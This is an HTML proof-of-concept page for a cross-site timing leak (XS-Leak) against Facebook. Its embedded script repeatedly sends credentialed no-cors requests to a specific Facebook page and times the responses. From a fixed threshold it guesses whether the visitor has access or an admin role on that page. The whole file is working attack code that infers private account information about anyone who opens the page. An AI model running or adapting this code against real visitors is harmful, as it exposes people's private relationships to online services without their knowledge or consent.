<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook XS-Leak PoC</title>
</head>
<body>
  <h2>Facebook XS-Leak Proof of Concept</h2>
  <p>Check the browser console (F12 > Console) for results.</p>

  <script>
    const targetURL = "https://www.facebook.com/130676333456599"; // Replace with actual page

    async function checkTiming() {
      const start = performance.now();

      try {
        await fetch(targetURL, {
          mode: "no-cors",
          credentials: "include"
        });
      } catch (e) {
        // No-cors request blocks reading response, expected
      }

      const end = performance.now();
      const duration = end - start;
      console.log(`⏱️ Response Time: ${duration.toFixed(2)} ms`);

      // Arbitrary threshold, adjust as needed based on test results
      if (duration > 2000) {
        console.log("⚠️ User likely has access or admin role");
      } else {
        console.log("✅ User likely does NOT have access");
      }
    }

    for (let i = 0; i < 5; i++) {
      setTimeout(checkTiming, i * 1500);
    }
  </script>
</body>
</html>
